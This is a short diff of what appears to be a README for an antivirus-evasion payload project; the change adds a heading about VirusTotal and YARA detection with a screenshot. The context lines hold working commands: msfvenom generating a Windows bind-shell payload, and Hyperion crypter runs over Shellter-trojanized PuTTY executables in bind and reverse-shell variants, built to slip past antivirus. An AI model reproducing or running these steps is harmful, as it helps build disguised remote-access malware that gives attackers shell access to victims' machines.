@@ -33,3 +33,7 @@ msfvenom -a x86 --platform windows -p windows/shell_bind_tcp -f raw -o /root/pay
 wine hyperion.exe /root/payloads/shellter/shellter_putty_bind_x86.exe /root/payloads/hyperion/hyperion_shellter_bind_putty_x86.exe 
 wine hyperion.exe /root/payloads/shellter/shellter_putty_reverse_x86.exe /root/payloads/hyperion/hyperion_shellter_reverse_putty_x86.exe 
 ```
+
+# VirusTotal and YARA Detection 
+<img width="583" alt="Screen Shot 2021-12-03 at 5 22 12 PM" src="https://user-images.githubusercontent.com/72598486/144680778-e92bd81b-7a97-4559-a564-44ba0217cd0f.png">
+
